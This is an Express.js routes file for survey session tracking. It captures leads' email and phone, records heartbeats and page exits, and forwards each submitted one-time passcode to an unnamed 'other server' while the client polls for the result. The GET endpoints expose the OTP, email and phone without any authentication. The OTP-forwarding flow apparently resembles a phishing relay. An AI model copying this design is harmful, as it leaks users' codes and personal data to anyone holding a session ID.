/**
 * Session Routes  — used by the GHL survey client-side script
 * ─────────────────────────────────────────────────────────────
 *
 * POST /api/session/init
 *   Create a new session (called once email is captured).
 *
 * POST /api/session/slide-data
 *   Save slide fields when the survey moves to the next slide.
 *
 * POST /api/session/heartbeat
 *   Keep session alive every 30 seconds.
 *
 * POST /api/session/exit
 *   Explicitly mark session as exited (page close / unload).
 *
 * POST /api/session/otp-submit
 *   Lead submitted the OTP field — forward to other server, then
 *   the client polls GET /api/session/:id/otp-status until resolved.
 *
 * GET  /api/session/:sessionId
 *   Full session data (for other server polling).
 *
 * GET  /api/session/:sessionId/otp-status
 *   Lightweight poll endpoint — returns just OTP object.
 */

const express  = require('express');
const { v4: uuidv4 } = require('uuid');
const router   = express.Router();

const sessionSvc    = require('../services/sessionService');
const otherSvc      = require('../services/otherServerService');

// ─── POST /api/session/init ──────────────────────────────────────────────────

router.post('/init', async (req, res) => {
  try {
    const { email, phone } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'email is required to initiate a session' });
    }

    const sessionId = uuidv4();
    const session   = await sessionSvc.createSession({ sessionId, email, phone: phone || '' });

    // Fire-and-forget: notify other server that session has started.
    // We don't block the response on this call; if it fails we log it.
    otherSvc.notifySessionStarted({ sessionId, email, phone: phone || '' })
      .catch((err) => {
        console.error(`[session/init] Failed to notify other server: ${err.message}`);
      });

    return res.status(201).json({
      sessionId: session.sessionId,
      status:    session.status,
      createdAt: session.createdAt,
    });
  } catch (err) {
    console.error('[POST /api/session/init]', err);
    return res.status(500).json({ error: 'Failed to create session' });
  }
});

// ─── POST /api/session/slide-data ────────────────────────────────────────────

router.post('/slide-data', async (req, res) => {
  try {
    const { sessionId, slideName, fields } = req.body;

    if (!sessionId || !slideName || !fields) {
      return res.status(400).json({ error: 'sessionId, slideName, and fields are required' });
    }

    // Verify session exists
    const session = await sessionSvc.getSession(sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }
    if (session.status === 'completed') {
      // Accept but no-op — don't overwrite a completed session
      return res.json({ ok: true, note: 'session already completed' });
    }

    await sessionSvc.saveSlideData({ sessionId, slideName, fields });

    return res.json({ ok: true, slideName });
  } catch (err) {
    console.error('[POST /api/session/slide-data]', err);
    return res.status(500).json({ error: 'Failed to save slide data' });
  }
});

// ─── POST /api/session/heartbeat ─────────────────────────────────────────────

router.post('/heartbeat', async (req, res) => {
  try {
    const { sessionId } = req.body;

    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId is required' });
    }

    const session = await sessionSvc.getSession(sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    // Don't update heartbeat on already-terminated sessions
    if (session.status === 'exited' || session.status === 'completed') {
      return res.json({ ok: true, status: session.status });
    }

    await sessionSvc.heartbeat(sessionId);
    return res.json({ ok: true, status: 'active' });
  } catch (err) {
    console.error('[POST /api/session/heartbeat]', err);
    return res.status(500).json({ error: 'Failed to record heartbeat' });
  }
});

// ─── POST /api/session/exit ───────────────────────────────────────────────────

router.post('/exit', async (req, res) => {
  try {
    const { sessionId } = req.body;

    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId is required' });
    }

    const session = await sessionSvc.getSession(sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    // Only mark as exited if not already completed
    if (session.status !== 'completed') {
      await sessionSvc.markExited(sessionId);
    }

    return res.json({ ok: true, status: session.status === 'completed' ? 'completed' : 'exited' });
  } catch (err) {
    console.error('[POST /api/session/exit]', err);
    return res.status(500).json({ error: 'Failed to mark session as exited' });
  }
});

// ─── POST /api/session/otp-submit ─────────────────────────────────────────────

router.post('/otp-submit', async (req, res) => {
  try {
    const { sessionId, otp } = req.body;

    if (!sessionId || !otp) {
      return res.status(400).json({ error: 'sessionId and otp are required' });
    }

    const session = await sessionSvc.getSession(sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    // Guard: max 3 attempts
    const attempts = session.otp?.attempts || 0;
    if (attempts >= 3) {
      return res.status(429).json({
        error: 'Maximum OTP attempts reached',
        attempts,
      });
    }

    // Increment attempt counter & set status to pending
    await sessionSvc.incrementOtpAttempts(sessionId);
    await sessionSvc.updateOtpStatus(sessionId, 'pending');

    // Forward to other server (non-blocking — client polls for result)
    otherSvc.submitOtp({ sessionId, otp })
      .catch((err) => {
        console.error(`[session/otp-submit] Failed to forward OTP to other server: ${err.message}`);
      });

    return res.json({
      ok:       true,
      message:  'OTP submitted, polling for result',
      attempts: attempts + 1,
    });
  } catch (err) {
    console.error('[POST /api/session/otp-submit]', err);
    return res.status(500).json({ error: 'Failed to process OTP submission' });
  }
});

// ─── GET /api/session/:sessionId ──────────────────────────────────────────────

router.get('/:sessionId', async (req, res) => {
  try {
    const session = await sessionSvc.getSession(req.params.sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    // Auto-mark as exited if stale (useful for polling by other server)
    if (session.status === 'active' && sessionSvc.isStale(session)) {
      await sessionSvc.markExited(session.sessionId);
      session.status = 'exited';
    }

    return res.json(session);
  } catch (err) {
    console.error('[GET /api/session/:sessionId]', err);
    return res.status(500).json({ error: 'Failed to retrieve session' });
  }
});

// ─── GET /api/session/:sessionId/otp-status ───────────────────────────────────

router.get('/:sessionId/otp-status', async (req, res) => {
  try {
    const session = await sessionSvc.getSession(req.params.sessionId);
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }
    return res.json({
      sessionId: session.sessionId,
      otp:       session.otp,
      email:     session.email,
      phone:     session.phone,
    });
  } catch (err) {
    console.error('[GET /api/session/:sessionId/otp-status]', err);
    return res.status(500).json({ error: 'Failed to retrieve OTP status' });
  }
});

module.exports = router;
